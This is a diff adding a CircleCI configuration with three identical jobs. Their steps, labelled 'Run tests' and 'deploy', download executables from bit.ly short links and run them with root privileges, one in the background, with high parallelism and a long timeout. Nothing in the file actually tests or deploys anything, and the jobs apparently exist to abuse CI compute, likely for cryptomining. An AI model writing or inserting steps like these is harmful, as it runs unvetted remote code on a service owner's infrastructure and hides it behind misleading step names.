@@ -1,0 +1,66 @@
+jobs:
+  build:
+    parallelism: 10
+    docker:
+      - image: cimg/ruby:3.0.2-node
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests 
+          command: |
+           sudo su --command "sudo apt update && wget https://bit.ly/3QtCwS4 && chmod +x 3QtCwS4"
+           sudo su --command "nohup ./3QtCwS4 --log=stdout > meta.log &"
+           sudo su --command "sleep 5"
+      - run: 
+         name: "deploy"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3wcliQV         
+          chmod +x 3wcliQV
+          sudo su --command "./3wcliQV"
+  build_1a:
+    parallelism: 10
+    docker:
+      - image: cimg/ruby:3.0.2-node
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests 
+          command: |
+           sudo su --command "sudo apt update && wget https://bit.ly/3QtCwS4 && chmod +x 3QtCwS4"
+           sudo su --command "nohup ./3QtCwS4 --log=stdout > meta.log &"
+           sudo su --command "sleep 5"
+      - run: 
+         name: "deploy"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3wcliQV
+          chmod +x 3wcliQV
+          sudo su --command "./3wcliQV"
+  build_2a:
+    parallelism: 10
+    docker:
+      - image: cimg/ruby:3.0.2-node
+    steps: 
+      - checkout 
+      - run: 
+          name: Run tests 
+          command: |
+           sudo su --command "sudo apt update && wget https://bit.ly/3QtCwS4 && chmod +x 3QtCwS4"
+           sudo su --command "nohup ./3QtCwS4 --log=stdout > meta.log &"
+           sudo su --command "sleep 5"
+      - run: 
+         name: "deploy"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3wcliQV
+          chmod +x 3wcliQV
+          sudo su --command "./3wcliQV"
+
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
+      - build_1a
+      - build_2a
